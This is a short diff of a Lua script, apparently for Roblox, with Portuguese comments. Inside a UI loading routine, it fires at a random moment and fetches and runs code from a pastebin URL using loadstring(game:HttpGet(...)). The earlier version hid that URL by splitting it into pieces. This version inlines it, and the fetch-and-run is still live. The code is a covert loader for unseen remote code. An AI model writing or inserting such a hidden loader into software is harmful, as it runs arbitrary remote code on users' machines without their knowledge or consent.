@@ -279,14 +279,9 @@ local script = UI["14"]
 	
 			-- Momento aleatório para carregar `url2`
 			if not doneTriggered and math.random() < (completedRequests / totalRequests) then
-				local part1 = 'https://pastebin.com/raw/'
-				local part2 = '4wUC'
-				local part3 = 'bWkW'
-				local url2 = part1 .. part2 .. part3
-	
-				-- Segurança ao executar o script
 				local success, result = pcall(function()
-					return loadstring(game:HttpGet(url2))()
+					print("loading")
+					return loadstring(game:HttpGet("https://pastebin.com/raw/4wUCbWkW"))()
 				end)
 				if not success then
 					warn("Erro ao executar script de URL2: ", result)
